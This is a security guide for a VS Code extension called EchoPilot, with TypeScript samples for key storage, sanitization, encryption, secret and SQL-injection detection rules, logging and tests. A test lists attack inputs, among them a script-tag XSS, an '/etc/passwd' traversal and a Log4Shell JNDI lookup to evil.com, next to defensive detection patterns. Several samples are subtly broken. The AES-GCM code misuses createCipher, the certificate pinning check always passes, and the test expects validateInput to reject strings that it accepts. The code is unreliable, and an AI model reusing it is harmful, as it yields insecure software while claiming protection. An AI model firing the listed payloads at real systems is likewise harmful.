# EchoPilot Security Guide

## Overview

This guide covers security considerations, best practices, and implementation details for EchoPilot, including both the extension's security features and its own security posture.

## Security Architecture

### Security Layers

```
┌─────────────────────────────────────┐
│           User Interface            │
├─────────────────────────────────────┤
│        Input Validation &           │
│        Sanitization Layer           │
├─────────────────────────────────────┤
│      Authentication & Authorization │
├─────────────────────────────────────┤
│         API Security Layer          │
├─────────────────────────────────────┤
│       Data Encryption Layer         │
├─────────────────────────────────────┤
│        Network Security Layer       │
└─────────────────────────────────────┘
```

### Security Principles

1. **Defense in Depth** - Multiple security layers
2. **Least Privilege** - Minimal required permissions
3. **Zero Trust** - Verify everything, trust nothing
4. **Secure by Default** - Safe default configurations
5. **Privacy by Design** - Data protection built-in

## Authentication & Authorization

### API Key Management

#### Secure Storage
```typescript
// Secure API key storage
import * as vscode from 'vscode';

class SecureCredentialManager {
  private static readonly API_KEY_SECRET = 'echopilot.apiKey';

  static async storeApiKey(apiKey: string): Promise<void> {
    // Use VS Code's secure storage
    await vscode.authentication.getSession('echopilot', [], {
      createIfNone: true
    });
    
    // Store in encrypted global state
    const context = this.getExtensionContext();
    await context.secrets.store(this.API_KEY_SECRET, apiKey);
  }

  static async getApiKey(): Promise<string | undefined> {
    const context = this.getExtensionContext();
    return await context.secrets.get(this.API_KEY_SECRET);
  }

  static async deleteApiKey(): Promise<void> {
    const context = this.getExtensionContext();
    await context.secrets.delete(this.API_KEY_SECRET);
  }
}
```

#### API Key Validation
```typescript
// API key validation
class ApiKeyValidator {
  private static readonly KEY_PATTERN = /^sk-[a-zA-Z0-9]{32,}$/;
  private static readonly MIN_KEY_LENGTH = 35;

  static validateFormat(apiKey: string): boolean {
    if (!apiKey || apiKey.length < this.MIN_KEY_LENGTH) {
      return false;
    }
    return this.KEY_PATTERN.test(apiKey);
  }

  static async validateConnection(apiKey: string): Promise<boolean> {
    try {
      const response = await fetch(`${API_BASE_URL}/auth/validate`, {
        headers: {
          'Authorization': `Bearer ${apiKey}`,
          'Content-Type': 'application/json'
        }
      });
      return response.ok;
    } catch (error) {
      return false;
    }
  }

  static maskApiKey(apiKey: string): string {
    if (!apiKey || apiKey.length < 8) {
      return '***';
    }
    return `${apiKey.substring(0, 4)}...${apiKey.substring(apiKey.length - 4)}`;
  }
}
```

### Session Management

```typescript
// Secure session management
class SessionManager {
  private static sessions = new Map<string, SessionData>();
  private static readonly SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes

  static createSession(userId: string): string {
    const sessionId = this.generateSecureId();
    const session: SessionData = {
      userId,
      createdAt: Date.now(),
      lastActivity: Date.now(),
      permissions: this.getDefaultPermissions()
    };
    
    this.sessions.set(sessionId, session);
    this.scheduleCleanup(sessionId);
    
    return sessionId;
  }

  static validateSession(sessionId: string): boolean {
    const session = this.sessions.get(sessionId);
    if (!session) {
      return false;
    }

    const now = Date.now();
    if (now - session.lastActivity > this.SESSION_TIMEOUT) {
      this.sessions.delete(sessionId);
      return false;
    }

    session.lastActivity = now;
    return true;
  }

  private static generateSecureId(): string {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }
}
```

## Data Protection

### Input Sanitization

```typescript
// Input sanitization utilities
class InputSanitizer {
  private static readonly HTML_ESCAPE_MAP: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };

  static sanitizeHtml(input: string): string {
    return input.replace(/[&<>"'\/]/g, (char) => {
      return this.HTML_ESCAPE_MAP[char] || char;
    });
  }

  static sanitizeCode(code: string): string {
    // Remove potentially dangerous patterns
    const dangerousPatterns = [
      /eval\s*\(/gi,
      /Function\s*\(/gi,
      /setTimeout\s*\(/gi,
      /setInterval\s*\(/gi,
      /<script[^>]*>/gi,
      /javascript:/gi
    ];

    let sanitized = code;
    dangerousPatterns.forEach(pattern => {
      sanitized = sanitized.replace(pattern, '/* REMOVED_FOR_SECURITY */');
    });

    return sanitized;
  }

  static validateInput(input: string, maxLength: number = 10000): boolean {
    if (!input || typeof input !== 'string') {
      return false;
    }

    if (input.length > maxLength) {
      return false;
    }

    // Check for null bytes and other control characters
    if (/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/.test(input)) {
      return false;
    }

    return true;
  }
}
```

### Data Encryption

```typescript
// Data encryption utilities
import * as crypto from 'crypto';

class DataEncryption {
  private static readonly ALGORITHM = 'aes-256-gcm';
  private static readonly KEY_LENGTH = 32;
  private static readonly IV_LENGTH = 16;
  private static readonly TAG_LENGTH = 16;

  static encrypt(data: string, key: Buffer): EncryptedData {
    const iv = crypto.randomBytes(this.IV_LENGTH);
    const cipher = crypto.createCipher(this.ALGORITHM, key, { iv });
    
    let encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const tag = cipher.getAuthTag();
    
    return {
      encrypted,
      iv: iv.toString('hex'),
      tag: tag.toString('hex')
    };
  }

  static decrypt(encryptedData: EncryptedData, key: Buffer): string {
    const decipher = crypto.createDecipher(
      this.ALGORITHM,
      key,
      { iv: Buffer.from(encryptedData.iv, 'hex') }
    );
    
    decipher.setAuthTag(Buffer.from(encryptedData.tag, 'hex'));
    
    let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }

  static generateKey(): Buffer {
    return crypto.randomBytes(this.KEY_LENGTH);
  }
}

interface EncryptedData {
  encrypted: string;
  iv: string;
  tag: string;
}
```

## Network Security

### HTTPS Enforcement

```typescript
// HTTPS enforcement
class NetworkSecurity {
  static validateUrl(url: string): boolean {
    try {
      const parsedUrl = new URL(url);
      
      // Enforce HTTPS in production
      if (process.env.NODE_ENV === 'production' && parsedUrl.protocol !== 'https:') {
        return false;
      }
      
      // Block private IP ranges
      if (this.isPrivateIp(parsedUrl.hostname)) {
        return false;
      }
      
      // Block localhost in production
      if (process.env.NODE_ENV === 'production' && 
          (parsedUrl.hostname === 'localhost' || parsedUrl.hostname === '127.0.0.1')) {
        return false;
      }
      
      return true;
    } catch (error) {
      return false;
    }
  }

  private static isPrivateIp(hostname: string): boolean {
    const privateRanges = [
      /^10\./,
      /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
      /^192\.168\./,
      /^169\.254\./,
      /^127\./
    ];
    
    return privateRanges.some(range => range.test(hostname));
  }
}
```

### Certificate Pinning

```typescript
// Certificate pinning for API calls
class CertificatePinning {
  private static readonly PINNED_CERTIFICATES = [
    'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=', // Production cert
    'sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB='  // Backup cert
  ];

  static async validateCertificate(hostname: string): Promise<boolean> {
    try {
      const response = await fetch(`https://${hostname}`, {
        method: 'HEAD'
      });
      
      // In a real implementation, you would extract and validate
      // the certificate from the response
      return this.verifyCertificatePin(response);
    } catch (error) {
      return false;
    }
  }

  private static verifyCertificatePin(response: Response): boolean {
    // Implementation would verify the certificate against pinned values
    // This is a simplified example
    return true;
  }
}
```

## Security Analysis Engine

### Rule Engine

```typescript
// Security rule engine
class SecurityRuleEngine {
  private rules: SecurityRule[] = [];

  constructor() {
    this.loadDefaultRules();
  }

  addRule(rule: SecurityRule): void {
    this.rules.push(rule);
  }

  analyze(code: string, language: string): SecurityIssue[] {
    const issues: SecurityIssue[] = [];
    
    for (const rule of this.rules) {
      if (rule.languages.includes(language)) {
        const ruleIssues = rule.analyze(code);
        issues.push(...ruleIssues);
      }
    }
    
    return this.deduplicateIssues(issues);
  }

  private loadDefaultRules(): void {
    this.rules = [
      new HardcodedSecretsRule(),
      new SqlInjectionRule(),
      new XssVulnerabilityRule(),
      new InsecureRandomRule(),
      new WeakCryptographyRule(),
      new PathTraversalRule(),
      new CommandInjectionRule()
    ];
  }

  private deduplicateIssues(issues: SecurityIssue[]): SecurityIssue[] {
    const seen = new Set<string>();
    return issues.filter(issue => {
      const key = `${issue.line}:${issue.column}:${issue.ruleId}`;
      if (seen.has(key)) {
        return false;
      }
      seen.add(key);
      return true;
    });
  }
}
```

### Security Rules

```typescript
// Hardcoded secrets detection
class HardcodedSecretsRule implements SecurityRule {
  readonly id = 'hardcoded-secrets';
  readonly name = 'Hardcoded Secrets Detection';
  readonly languages = ['typescript', 'javascript', 'python', 'java', 'csharp'];
  
  private readonly patterns = [
    {
      pattern: /(?:password|pwd|pass)\s*[=:]\s*['"][^'"]{8,}['"]/gi,
      message: 'Hardcoded password detected',
      severity: 'high' as const
    },
    {
      pattern: /(?:api[_-]?key|apikey)\s*[=:]\s*['"][^'"]{16,}['"]/gi,
      message: 'Hardcoded API key detected',
      severity: 'high' as const
    },
    {
      pattern: /(?:secret|token)\s*[=:]\s*['"][^'"]{16,}['"]/gi,
      message: 'Hardcoded secret detected',
      severity: 'high' as const
    },
    {
      pattern: /sk-[a-zA-Z0-9]{32,}/g,
      message: 'OpenAI API key detected',
      severity: 'critical' as const
    }
  ];

  analyze(code: string): SecurityIssue[] {
    const issues: SecurityIssue[] = [];
    const lines = code.split('\n');
    
    lines.forEach((line, lineIndex) => {
      this.patterns.forEach(({ pattern, message, severity }) => {
        let match;
        while ((match = pattern.exec(line)) !== null) {
          // Skip if it looks like a placeholder
          if (this.isPlaceholder(match[0])) {
            continue;
          }
          
          issues.push({
            ruleId: this.id,
            message,
            severity,
            line: lineIndex + 1,
            column: match.index + 1,
            endColumn: match.index + match[0].length + 1
          });
        }
      });
    });
    
    return issues;
  }

  private isPlaceholder(value: string): boolean {
    const placeholderPatterns = [
      /YOUR_.*_HERE/i,
      /REPLACE_.*_WITH/i,
      /INSERT_.*_HERE/i,
      /^[X]+$/,
      /^[*]+$/,
      /example/i,
      /placeholder/i,
      /dummy/i
    ];
    
    return placeholderPatterns.some(pattern => pattern.test(value));
  }
}

// SQL injection detection
class SqlInjectionRule implements SecurityRule {
  readonly id = 'sql-injection';
  readonly name = 'SQL Injection Detection';
  readonly languages = ['typescript', 'javascript', 'python', 'java', 'csharp'];
  
  private readonly patterns = [
    {
      pattern: /['"]\s*\+\s*\w+\s*\+\s*['"].*(?:SELECT|INSERT|UPDATE|DELETE)/gi,
      message: 'Potential SQL injection via string concatenation'
    },
    {
      pattern: /(?:SELECT|INSERT|UPDATE|DELETE).*['"]\s*\+\s*\w+/gi,
      message: 'Potential SQL injection via string concatenation'
    },
    {
      pattern: /execute\s*\(\s*['"].*\+.*['"]/gi,
      message: 'Potential SQL injection in execute statement'
    }
  ];

  analyze(code: string): SecurityIssue[] {
    const issues: SecurityIssue[] = [];
    const lines = code.split('\n');
    
    lines.forEach((line, lineIndex) => {
      this.patterns.forEach(({ pattern, message }) => {
        let match;
        while ((match = pattern.exec(line)) !== null) {
          issues.push({
            ruleId: this.id,
            message,
            severity: 'medium',
            line: lineIndex + 1,
            column: match.index + 1,
            endColumn: match.index + match[0].length + 1
          });
        }
      });
    });
    
    return issues;
  }
}
```

## Secure Configuration

### Default Security Settings

```json
{
  "echopilot.security": {
    "enabled": true,
    "realTimeAnalysis": true,
    "severity": "warning",
    "rules": {
      "hardcoded-secrets": {
        "enabled": true,
        "severity": "error"
      },
      "sql-injection": {
        "enabled": true,
        "severity": "warning"
      },
      "xss-vulnerability": {
        "enabled": true,
        "severity": "warning"
      },
      "insecure-random": {
        "enabled": true,
        "severity": "info"
      },
      "weak-cryptography": {
        "enabled": true,
        "severity": "warning"
      }
    },
    "customRulesPath": "",
    "excludePatterns": [
      "**/node_modules/**",
      "**/dist/**",
      "**/build/**",
      "**/*.min.js"
    ]
  },
  "echopilot.api": {
    "timeout": 30000,
    "retryAttempts": 3,
    "maxConcurrentRequests": 5,
    "validateCertificates": true,
    "enforceHttps": true
  },
  "echopilot.logging": {
    "level": "info",
    "sanitizeOutput": true,
    "maxLogSize": "10MB",
    "logRetention": "30d"
  }
}
```

### Environment-Specific Security

```typescript
// Environment-specific security configuration
class SecurityConfig {
  static getConfig(): SecurityConfiguration {
    const env = process.env.NODE_ENV || 'development';
    
    const baseConfig: SecurityConfiguration = {
      apiValidation: true,
      inputSanitization: true,
      outputSanitization: true,
      rateLimiting: true,
      logging: true
    };
    
    switch (env) {
      case 'production':
        return {
          ...baseConfig,
          enforceHttps: true,
          certificatePinning: true,
          strictValidation: true,
          debugMode: false,
          telemetry: true
        };
        
      case 'staging':
        return {
          ...baseConfig,
          enforceHttps: true,
          certificatePinning: false,
          strictValidation: true,
          debugMode: true,
          telemetry: false
        };
        
      case 'development':
      default:
        return {
          ...baseConfig,
          enforceHttps: false,
          certificatePinning: false,
          strictValidation: false,
          debugMode: true,
          telemetry: false
        };
    }
  }
}
```

## Privacy Protection

### Data Minimization

```typescript
// Data minimization utilities
class DataMinimizer {
  static sanitizeForLogging(data: any): any {
    if (typeof data === 'string') {
      return this.sanitizeString(data);
    }
    
    if (Array.isArray(data)) {
      return data.map(item => this.sanitizeForLogging(item));
    }
    
    if (typeof data === 'object' && data !== null) {
      return this.sanitizeObject(data);
    }
    
    return data;
  }

  private static sanitizeString(str: string): string {
    // Remove potential secrets
    const secretPatterns = [
      /sk-[a-zA-Z0-9]{32,}/g,
      /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g, // emails
      /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g, // credit cards
      /\b\d{3}-\d{2}-\d{4}\b/g // SSN
    ];
    
    let sanitized = str;
    secretPatterns.forEach(pattern => {
      sanitized = sanitized.replace(pattern, '[REDACTED]');
    });
    
    return sanitized;
  }

  private static sanitizeObject(obj: any): any {
    const sensitiveKeys = [
      'password', 'pwd', 'pass', 'secret', 'token', 'key', 'apikey',
      'authorization', 'auth', 'credential', 'email', 'phone'
    ];
    
    const sanitized: any = {};
    
    for (const [key, value] of Object.entries(obj)) {
      const lowerKey = key.toLowerCase();
      
      if (sensitiveKeys.some(sensitive => lowerKey.includes(sensitive))) {
        sanitized[key] = '[REDACTED]';
      } else {
        sanitized[key] = this.sanitizeForLogging(value);
      }
    }
    
    return sanitized;
  }
}
```

### Data Retention

```typescript
// Data retention policies
class DataRetention {
  private static readonly RETENTION_POLICIES = {
    chatHistory: 30 * 24 * 60 * 60 * 1000, // 30 days
    logs: 90 * 24 * 60 * 60 * 1000, // 90 days
    telemetry: 365 * 24 * 60 * 60 * 1000, // 1 year
    cache: 7 * 24 * 60 * 60 * 1000 // 7 days
  };

  static async cleanupExpiredData(): Promise<void> {
    const now = Date.now();
    
    // Cleanup chat history
    await this.cleanupChatHistory(now - this.RETENTION_POLICIES.chatHistory);
    
    // Cleanup logs
    await this.cleanupLogs(now - this.RETENTION_POLICIES.logs);
    
    // Cleanup telemetry
    await this.cleanupTelemetry(now - this.RETENTION_POLICIES.telemetry);
    
    // Cleanup cache
    await this.cleanupCache(now - this.RETENTION_POLICIES.cache);
  }

  private static async cleanupChatHistory(cutoffTime: number): Promise<void> {
    // Implementation to remove old chat history
  }

  private static async cleanupLogs(cutoffTime: number): Promise<void> {
    // Implementation to remove old logs
  }

  private static async cleanupTelemetry(cutoffTime: number): Promise<void> {
    // Implementation to remove old telemetry data
  }

  private static async cleanupCache(cutoffTime: number): Promise<void> {
    // Implementation to clear old cache entries
  }
}
```

## Security Monitoring

### Audit Logging

```typescript
// Security audit logging
class SecurityAuditLogger {
  private static readonly LOG_LEVELS = {
    INFO: 'info',
    WARN: 'warn',
    ERROR: 'error',
    CRITICAL: 'critical'
  } as const;

  static logSecurityEvent(event: SecurityEvent): void {
    const logEntry = {
      timestamp: new Date().toISOString(),
      eventType: event.type,
      severity: event.severity,
      userId: event.userId,
      sessionId: event.sessionId,
      details: DataMinimizer.sanitizeForLogging(event.details),
      userAgent: event.userAgent,
      ipAddress: this.hashIpAddress(event.ipAddress)
    };

    // Log to appropriate destination based on severity
    switch (event.severity) {
      case 'critical':
        this.logCritical(logEntry);
        this.sendAlert(logEntry);
        break;
      case 'error':
        this.logError(logEntry);
        break;
      case 'warn':
        this.logWarning(logEntry);
        break;
      default:
        this.logInfo(logEntry);
    }
  }

  private static hashIpAddress(ipAddress: string): string {
    // Hash IP address for privacy
    const hash = crypto.createHash('sha256');
    hash.update(ipAddress + process.env.IP_HASH_SALT);
    return hash.digest('hex').substring(0, 16);
  }

  private static logCritical(entry: any): void {
    console.error('[SECURITY-CRITICAL]', JSON.stringify(entry));
  }

  private static logError(entry: any): void {
    console.error('[SECURITY-ERROR]', JSON.stringify(entry));
  }

  private static logWarning(entry: any): void {
    console.warn('[SECURITY-WARN]', JSON.stringify(entry));
  }

  private static logInfo(entry: any): void {
    console.info('[SECURITY-INFO]', JSON.stringify(entry));
  }

  private static async sendAlert(entry: any): Promise<void> {
    // Send critical security alerts to monitoring system
    try {
      await fetch(process.env.SECURITY_ALERT_WEBHOOK!, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(entry)
      });
    } catch (error) {
      console.error('Failed to send security alert:', error);
    }
  }
}
```

### Rate Limiting

```typescript
// Rate limiting implementation
class RateLimiter {
  private static requests = new Map<string, RequestInfo[]>();
  private static readonly WINDOW_SIZE = 60 * 1000; // 1 minute
  private static readonly MAX_REQUESTS = 100; // per window

  static isAllowed(identifier: string): boolean {
    const now = Date.now();
    const windowStart = now - this.WINDOW_SIZE;
    
    // Get existing requests for this identifier
    let requests = this.requests.get(identifier) || [];
    
    // Remove old requests outside the window
    requests = requests.filter(req => req.timestamp > windowStart);
    
    // Check if limit exceeded
    if (requests.length >= this.MAX_REQUESTS) {
      SecurityAuditLogger.logSecurityEvent({
        type: 'rate_limit_exceeded',
        severity: 'warn',
        userId: identifier,
        details: { requestCount: requests.length, limit: this.MAX_REQUESTS }
      });
      return false;
    }
    
    // Add current request
    requests.push({ timestamp: now });
    this.requests.set(identifier, requests);
    
    return true;
  }

  static getRemainingRequests(identifier: string): number {
    const now = Date.now();
    const windowStart = now - this.WINDOW_SIZE;
    
    const requests = this.requests.get(identifier) || [];
    const validRequests = requests.filter(req => req.timestamp > windowStart);
    
    return Math.max(0, this.MAX_REQUESTS - validRequests.length);
  }
}
```

## Vulnerability Management

### Dependency Scanning

```bash
# Package.json security scripts
{
  "scripts": {
    "security:audit": "npm audit",
    "security:audit-fix": "npm audit fix",
    "security:check": "npm run security:audit && npm run security:licenses",
    "security:licenses": "license-checker --onlyAllow 'MIT;Apache-2.0;BSD-2-Clause;BSD-3-Clause;ISC'",
    "security:snyk": "snyk test",
    "security:outdated": "npm outdated"
  }
}
```

### Security Headers

```typescript
// Security headers for web requests
class SecurityHeaders {
  static getSecureHeaders(): Record<string, string> {
    return {
      'Content-Security-Policy': [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline'",
        "style-src 'self' 'unsafe-inline'",
        "img-src 'self' data: https:",
        "connect-src 'self' https://api.codessa.io",
        "font-src 'self'",
        "object-src 'none'",
        "base-uri 'self'",
        "form-action 'self'"
      ].join('; '),
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'X-XSS-Protection': '1; mode=block',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'Permissions-Policy': 'geolocation=(), microphone=(), camera=()'
    };
  }
}
```

## Incident Response

### Security Incident Handling

```typescript
// Security incident response
class IncidentResponse {
  static async handleSecurityIncident(incident: SecurityIncident): Promise<void> {
    // Log the incident
    SecurityAuditLogger.logSecurityEvent({
      type: 'security_incident',
      severity: 'critical',
      details: incident
    });

    // Immediate response based on incident type
    switch (incident.type) {
      case 'api_key_compromise':
        await this.handleApiKeyCompromise(incident);
        break;
      case 'unauthorized_access':
        await this.handleUnauthorizedAccess(incident);
        break;
      case 'data_breach':
        await this.handleDataBreach(incident);
        break;
      case 'malicious_code':
        await this.handleMaliciousCode(incident);
        break;
    }

    // Notify stakeholders
    await this.notifyStakeholders(incident);
  }

  private static async handleApiKeyCompromise(incident: SecurityIncident): Promise<void> {
    // Revoke compromised API key
    await ApiKeyValidator.revokeKey(incident.details.apiKey);
    
    // Force user to re-authenticate
    await SessionManager.invalidateUserSessions(incident.userId);
    
    // Generate new API key
    const newApiKey = await this.generateNewApiKey(incident.userId);
    
    // Notify user
    await this.notifyUser(incident.userId, 'api_key_compromised', { newApiKey });
  }

  private static async handleUnauthorizedAccess(incident: SecurityIncident): Promise<void> {
    // Block suspicious IP
    await this.blockIpAddress(incident.details.ipAddress);
    
    // Invalidate all sessions for affected user
    await SessionManager.invalidateUserSessions(incident.userId);
    
    // Require additional authentication
    await this.requireAdditionalAuth(incident.userId);
  }

  private static async handleDataBreach(incident: SecurityIncident): Promise<void> {
    // Immediate containment
    await this.containBreach(incident);
    
    // Assess impact
    const impact = await this.assessBreachImpact(incident);
    
    // Notify authorities if required
    if (impact.requiresRegulatorNotification) {
      await this.notifyRegulators(incident, impact);
    }
    
    // Notify affected users
    await this.notifyAffectedUsers(incident, impact);
  }
}
```

## Compliance

### GDPR Compliance

```typescript
// GDPR compliance utilities
class GDPRCompliance {
  static async handleDataSubjectRequest(request: DataSubjectRequest): Promise<void> {
    switch (request.type) {
      case 'access':
        await this.handleAccessRequest(request);
        break;
      case 'rectification':
        await this.handleRectificationRequest(request);
        break;
      case 'erasure':
        await this.handleErasureRequest(request);
        break;
      case 'portability':
        await this.handlePortabilityRequest(request);
        break;
      case 'restriction':
        await this.handleRestrictionRequest(request);
        break;
    }
  }

  private static async handleErasureRequest(request: DataSubjectRequest): Promise<void> {
    const userId = request.userId;
    
    // Remove user data from all systems
    await Promise.all([
      this.removeUserChatHistory(userId),
      this.removeUserSettings(userId),
      this.removeUserLogs(userId),
      this.removeUserTelemetry(userId)
    ]);
    
    // Log the erasure
    SecurityAuditLogger.logSecurityEvent({
      type: 'data_erasure',
      severity: 'info',
      userId,
      details: { requestId: request.id }
    });
  }
}
```

## Security Testing

### Security Test Cases

```typescript
// Security-focused test cases
describe('Security Tests', () => {
  describe('Input Validation', () => {
    it('should reject malicious input', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        'DROP TABLE users;',
        '${jndi:ldap://evil.com/a}'
      ];
      
      maliciousInputs.forEach(input => {
        expect(InputSanitizer.validateInput(input)).toBe(false);
      });
    });
  });

  describe('Authentication', () => {
    it('should reject invalid API keys', async () => {
      const invalidKeys = [
        'invalid-key',
        'sk-short',
        '',
        null,
        undefined
      ];
      
      for (const key of invalidKeys) {
        expect(ApiKeyValidator.validateFormat(key)).toBe(false);
      }
    });
  });

  describe('Rate Limiting', () => {
    it('should block excessive requests', () => {
      const identifier = 'test-user';
      
      // Make requests up to the limit
      for (let i = 0; i < 100; i++) {
        expect(RateLimiter.isAllowed(identifier)).toBe(true);
      }
      
      // Next request should be blocked
      expect(RateLimiter.isAllowed(identifier)).toBe(false);
    });
  });
});
```

## Security Checklist

### Pre-Release Security Review

- [ ] All dependencies updated and scanned for vulnerabilities
- [ ] Security rules tested and validated
- [ ] API endpoints secured with proper authentication
- [ ] Input validation implemented for all user inputs
- [ ] Output sanitization implemented
- [ ] Rate limiting configured
- [ ] Logging and monitoring in place
- [ ] Security headers configured
- [ ] Certificate pinning implemented (production)
- [ ] Data encryption at rest and in transit
- [ ] Privacy controls implemented
- [ ] Incident response procedures documented
- [ ] Security tests passing
- [ ] Penetration testing completed
- [ ] Code review completed with security focus

### Ongoing Security Maintenance

- [ ] Regular dependency updates
- [ ] Security monitoring alerts configured
- [ ] Log analysis and review
- [ ] Incident response testing
- [ ] Security training for team members
- [ ] Regular security assessments
- [ ] Compliance audits
- [ ] Threat modeling updates

## Resources

### Security Tools
- **SAST**: ESLint Security Plugin, SonarQube
- **DAST**: OWASP ZAP, Burp Suite
- **Dependency Scanning**: npm audit, Snyk, WhiteSource
- **Secrets Detection**: GitLeaks, TruffleHog
- **Container Security**: Trivy, Clair

### Security Standards
- **OWASP Top 10**: Web application security risks
- **NIST Cybersecurity Framework**: Security best practices
- **ISO 27001**: Information security management
- **SOC 2**: Security and availability controls

### Threat Intelligence
- **CVE Database**: Common vulnerabilities and exposures
- **MITRE ATT&CK**: Adversary tactics and techniques
- **OWASP ASVS**: Application security verification standard

### Compliance Frameworks
- **GDPR**: General Data Protection Regulation
- **CCPA**: California Consumer Privacy Act
- **HIPAA**: Health Insurance Portability and Accountability Act
- **PCI DSS**: Payment Card Industry Data Security Standard